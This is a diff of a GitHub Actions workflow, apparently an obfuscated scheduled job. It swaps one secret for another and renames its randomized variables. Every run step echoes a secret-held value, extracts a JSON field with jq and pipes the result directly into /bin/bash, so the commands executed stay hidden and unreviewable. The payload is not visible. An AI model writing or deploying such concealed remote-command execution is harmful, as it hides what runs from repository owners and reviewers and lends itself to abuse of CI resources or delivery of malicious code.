@@ -2,20 +2,19 @@ name: qingtongqingong
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 4/6 * * *'
-
+    - cron: '13 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: qingtongqingong
         env:
-          jg226: ${{ secrets.jg226 }}
+          dcxxl5599: ${{ secrets.dcxxl5599 }}
         run: |
-          echo $jg226 | jq -r .nzs60 | /bin/bash
-          echo $yemh76044 | jq -r .iywup085 | /bin/bash
-          echo $ud913 | jq -r .e20 | /bin/bash
-          echo $rmg69700 | jq -r .wf318 | /bin/bash
+          echo $dcxxl5599 | jq -r .gdnse7 | /bin/bash
+          echo $fu5098 | jq -r .ixszp09939 | /bin/bash
+          echo $avzp01 | jq -r .czpp0 | /bin/bash
+          echo $np49 | jq -r .hd5 | /bin/bash
+          echo $fde6 | jq -r .iuey47 | /bin/bash
 
